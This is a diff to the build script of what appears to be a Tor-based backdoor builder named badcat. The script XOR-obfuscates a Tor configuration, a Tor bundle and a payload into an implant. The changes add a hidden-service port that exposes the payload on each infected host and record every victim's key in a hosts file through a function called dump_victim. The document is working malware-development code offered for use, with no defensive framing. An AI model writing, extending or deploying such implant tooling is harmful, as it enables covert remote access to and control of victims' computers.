@@ -1,7 +1,7 @@
 use std::path::{Path, PathBuf};
 use std::{collections, error, fs, process};
 
-use badcat_lib::{http, xor};
+use badcat_lib::{http, xor, secrets};
 use hex::FromHex;
 
 const CFG_TEMPLATE: &str = "config.rs.template";
@@ -50,6 +50,8 @@ struct BuildSetting {
 }
 
 fn main() -> Result<(), Box<dyn error::Error>> {
+    println!("cargo:rerun-if-changed=src/");
+
     let raw_settings: json::JsonValue = load_settings()?;
 
     let setting = parse_settings(&raw_settings);
@@ -80,11 +82,6 @@ ControlSocket @{CTRL_SOCKET}
     let enc_tor_dir = xor::encode(&setting.key, &String::from(tor_dir.to_str().unwrap()));
     replacements.insert("@{ENC_TOR_DIR}", enc_tor_dir);
 
-    let enc_torrc = xor::encode(&setting.key, &torrc);
-    replacements.insert("@{ENC_TORRC}", enc_torrc);
-
-    replacements.insert("@{ENC_TOR_BUNDLE}", bundle_tor(&setting)?);
-
     let enc_payload_data = if setting.uses_payload {
         if &setting.payload_port == "" {
             return Err(String::from("payload port is required").into());
@@ -97,7 +94,21 @@ ControlSocket @{CTRL_SOCKET}
     };
 
     replacements.insert("@{ENC_PAYLOAD_DATA}", enc_payload_data);
-    replacements.insert("@{PAYLOAD_PORT}", setting.payload_port);
+    replacements.insert("@{PAYLOAD_PORT}", setting.payload_port.clone());
+
+    if setting.uses_payload {
+        // add a hidden service for the payload
+        torrc += &format!(
+            "\nHiddenServicePort {} 127.0.0.1:{}\n",
+            &setting.payload_port,
+            &setting.payload_port
+        );
+    }
+
+    let enc_torrc = xor::encode(&setting.key, &torrc);
+    replacements.insert("@{ENC_TORRC}", enc_torrc);
+
+    replacements.insert("@{ENC_TOR_BUNDLE}", bundle_tor(&setting)?);
 
     replace_settings(CFG_TEMPLATE, CFG_DESTINATION, &replacements)?;
 
@@ -149,6 +160,7 @@ fn dump_victim(address: String, setting: &BuildSetting) -> Result<(), Box<dyn er
     host["address"] = address.into();
     host["uses_payload"] = setting.uses_payload.into();
     host["name"] = setting.name.clone().into();
+    host["key"] = setting.key.clone().into();
 
     hosts.push(host)?;
     fs::write(&setting.hosts_file, hosts.pretty(4))?;
@@ -273,7 +285,7 @@ fn parse_settings(raw: &json::JsonValue) -> BuildSetting {
             panic!("key must be a string");
         }))
     } else {
-        xor::secret_key()
+        secrets::new_key(64)
     };
 
     let is_tor_for_windows = raw["tor"]["build_for_windows"].as_bool().unwrap_or(false);
